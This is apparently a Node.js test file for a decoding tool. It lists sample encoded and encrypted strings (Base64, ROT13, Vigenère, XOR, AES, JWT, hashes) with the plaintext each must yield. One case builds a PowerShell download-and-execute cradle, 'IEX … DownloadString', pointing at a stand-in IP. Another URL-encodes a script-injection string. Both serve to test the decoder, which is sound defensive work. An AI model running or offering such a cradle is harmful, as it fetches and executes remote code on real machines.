/**
 * "Typical" puzzle/test strings people (and chatbots) use to try a decoder: classic textbook
 * vectors (Wikipedia Vigenère example, jwt.io sample token, MD5("hello"), …) plus strings made
 * here with Node/OpenSSL. Each entry: input, optional keys, and text the output must contain.
 *   node test/typical/run-typical.mjs
 */
import crypto from "node:crypto";
import zlib from "node:zlib";
import { pathToFileURL } from "node:url";
import { autoChef } from "../../src/index.mjs";

const msg = "The quick brown fox jumps over the lazy dog";
const b64 = s => Buffer.from(s).toString("base64");
const evp = (pass, salt) => { let d = Buffer.alloc(0), p = Buffer.alloc(0); while (d.length < 48) { p = crypto.createHash("md5").update(Buffer.concat([p, Buffer.from(pass), salt])).digest(); d = Buffer.concat([d, p]); } return d; };
const salted = (pt, pass, kdf) => { const salt = crypto.randomBytes(8); const km = kdf === "pbkdf2" ? crypto.pbkdf2Sync(pass, salt, 10000, 48, "sha256") : evp(pass, salt); const c = crypto.createCipheriv("aes-256-cbc", km.subarray(0, 32), km.subarray(32)); return Buffer.concat([Buffer.from("Salted__"), salt, c.update(pt), c.final()]).toString("base64"); };
const aesEcb = (pt, key) => { const c = crypto.createCipheriv("aes-128-ecb", Buffer.from(key), null); return Buffer.concat([c.update(pt), c.final()]).toString("base64"); };
function vig(s, key) { let j = 0; return s.replace(/[a-z]/gi, c => { const o = c <= "Z" ? 65 : 97; return String.fromCharCode((c.charCodeAt(0) - o + key.charCodeAt(j++ % key.length) - 97) % 26 + o); }); }
const xorHex = (pt, key) => Buffer.from(Buffer.from(pt).map((x, i) => x ^ key.charCodeAt(i % key.length))).toString("hex");

export const CASES = [
    { name: "Base64", input: "SGVsbG8sIFdvcmxkIQ==", want: "Hello, World!" },
    { name: "Base64 twice", input: b64(b64(msg)), want: msg },
    { name: "Base64 ×5", input: [1, 2, 3, 4, 5].reduce(s => b64(s), msg), want: msg },
    { name: "Hex", input: Buffer.from(msg).toString("hex"), want: msg },
    { name: "Base32", input: "JBSWY3DPEBLW64TMMQQQ====", want: "Hello World!" },
    { name: "Base58 (Bitcoin alphabet)", input: "JxF12TrwUP45BMd", want: "Hello World" },
    { name: "Ascii85", input: "<~87cURD]i,\"Ebo80~>", want: "Hello World" },
    { name: "ROT13", input: "Gur dhvpx oebja sbk whzcf bire gur ynml qbt", want: msg },
    { name: "Caesar shift 3", input: "Wkh txlfn eurzq ira mxpsv ryhu wkh odcb grj", want: msg },
    { name: "ROT47", input: "%96 BF:4< 3C@H? 7@I ;F>AD @G6C E96 =2KJ 5@8", want: msg },
    { name: "Atbash", input: "Gsv jfrxp yildm ulc qfnkh levi gsv ozab wlt", want: msg },
    { name: "Reversed", input: [...msg].reverse().join(""), want: msg },
    { name: "Binary", input: [...Buffer.from("Hello World")].map(x => x.toString(2).padStart(8, "0")).join(" "), want: "Hello World" },
    { name: "Octal", input: [...Buffer.from("Hello World")].map(x => x.toString(8)).join(" "), want: "Hello World" },
    { name: "Decimal char codes", input: [...Buffer.from(msg)].join(","), want: msg },
    { name: "URL encoding", input: encodeURIComponent("<script>alert('x')</script>"), want: "<script>alert('x')</script>" },
    { name: "HTML entities", input: [...msg].map(c => `&#${c.charCodeAt(0)};`).join(""), want: msg },
    { name: "Unicode escapes", input: [...msg].map(c => "\\u" + c.charCodeAt(0).toString(16).padStart(4, "0")).join(""), want: msg },
    { name: "Morse code", input: ".... . .-.. .-.. --- / .-- --- .-. .-.. -..", want: "HELLO WORLD", lossy: true },
    { name: "A1Z26", input: "8 5 12 12 15", want: "HELLO", lossy: true },
    { name: "Gzip + Base64", input: zlib.gzipSync(msg).toString("base64"), want: msg },
    { name: "Zlib + Base64", input: zlib.deflateSync(msg).toString("base64"), want: msg },
    { name: "Raw deflate + Base64 (PowerShell style)", input: zlib.deflateRawSync("IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a.ps1')").toString("base64"), want: "DownloadString" },
    { name: "Hex → Base64 → ROT13", input: Buffer.from(b64(Buffer.from(msg).toString("hex"))).toString().replace(/[a-z]/gi, c => String.fromCharCode((c.charCodeAt(0) - (c <= "Z" ? 65 : 97) + 13) % 26 + (c <= "Z" ? 65 : 97))), want: msg },
    { name: "JWT (jwt.io sample)", input: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c", want: "John Doe" },
    { name: "Vigenère, key given (Wikipedia: LEMON)", input: "LXFOPVEFRNHR", keys: ["LEMON"], want: "ATTACKATDAWN", lossy: true },
    { name: "Caesar shift 4", input: "Xli uymgo fvsar jsb nyqtw sziv xli pedc hsk", want: msg },
    { name: "Vigenère, key unknown (recovered)", input: vig("Attackers often encode their payloads several times so that simple scanners miss them. This sentence was encrypted with a short secret word.", "lemon"), want: "Attackers often encode" },
    { name: "XOR with password, hex", input: xorHex(msg, "secret"), keys: ["secret"], want: msg },
    { name: "XOR single byte 0x5A, hex", input: xorHex(msg, "Z"), want: msg },
    { name: "AES-128-ECB, key given", input: aesEcb(msg, "YELLOW SUBMARINE"), keys: ["YELLOW SUBMARINE"], want: msg },
    { name: "OpenSSL enc -aes-256-cbc -pbkdf2 (password)", input: salted(msg, "infected", "pbkdf2"), keys: ["infected"], want: msg },
    { name: "CryptoJS.AES.encrypt (password)", input: salted(msg, "P@ssw0rd!", "md5"), keys: ["P@ssw0rd!"], want: msg },
    { name: "MD5 hash (hello)", input: "5d41402abc4b2a76b9719d911017c592", want: "MD5", hash: true },
    { name: "SHA-256 hash", input: crypto.createHash("sha256").update("hello").digest("hex"), want: "SHA-256", hash: true },
];

export const norm = s => s.replace(/\s+/g, " ").trim(), lossyN = s => s.toUpperCase().replace(/[^A-Z0-9]/g, "");
/** did a result list solve case c? (shared with the browser test) */
export function judge(c, res) {
    if (c.hash) { const h = !!(res.hash && res.hash.types.some(t => t.includes(c.want))); return [h, h]; }
    const outs = res.results.map(r => r.output.base64 ? Buffer.from(r.output.base64, "base64").toString("latin1") : (r.output.preview || ""));
    const hit = o => c.lossy ? lossyN(o).includes(lossyN(c.want)) : norm(o).includes(c.want);
    return [!!outs[0] && hit(outs[0]), outs.some(hit)];
}
if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) {
let ok1 = 0, ok5 = 0;
const fails = [];
for (const c of CASES) {
    const res = await autoChef(new Uint8Array(Buffer.from(c.input)), { timeBudgetMs: 12000, maxResults: 5, keys: c.keys || [] });
    const [hit1, hit5] = judge(c, res);
    ok1 += hit1; ok5 += hit5;
    console.log(`${hit1 ? "OK " : hit5 ? "ok5" : "FAIL"}  ${c.name.padEnd(44)} ${res.results[0] ? res.results[0].recipe.map(o => o.op).join(" > ") : (res.hash ? "hash: " + res.hash.types.join(", ") : "-")}`);
    if (!hit5) fails.push(c.name);
}
console.log(`\n${CASES.length} typical strings: top-1 ${ok1}, top-5 ${ok5}`);
process.exit(0);
}
